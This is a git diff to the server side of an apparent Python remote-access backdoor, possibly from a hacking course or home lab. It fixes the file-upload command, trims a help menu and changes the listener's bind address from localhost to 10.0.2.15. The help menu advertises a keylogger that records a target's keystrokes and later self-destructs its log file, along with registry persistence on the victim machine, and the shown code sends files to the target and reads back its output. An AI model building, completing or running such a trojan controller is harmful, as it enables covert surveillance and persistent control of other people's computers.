@@ -20,7 +20,7 @@ def send(data):
 
 
 def upload_file(file_name):
-    file = opem(file_name, 'rb')
+    file = open(file_name, 'rb')
     target.send(file.read())
 
 
@@ -34,8 +34,8 @@ def target_communication():
             os.system('clear')
         elif command[:3] == 'cd ':
             pass
-        elif command[7:] == 'upload':
-            upload_file(command)
+        elif command[:6] == 'upload':
+            upload_file(command[7:])
         elif command == 'help':
             print(colored('''\n
             quit                                --> Quit Session With The Target
@@ -46,14 +46,14 @@ def target_communication():
             keylog_start                        --> Start The Keylogger
             keylog_dump                         --> Print Keystrokes That The Target Inputted
             keylog_stop                         --> Stop And Self Destruct Keylogger File
-            persistence *RegName* *fileName*    --> Create Persistence In Registry\n\n\n''', 'red'))
+            persistence *RegName* *fileName*    --> Create Persistence In Registry\n\n''', 'red'))
         else:
             result = receive()
             print(result)
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('127.0.0.1', 5555))
+sock.bind(('10.0.2.15', 5555))
 print(colored('[0_0] Listening...', 'green'))
 sock.listen(5)
 
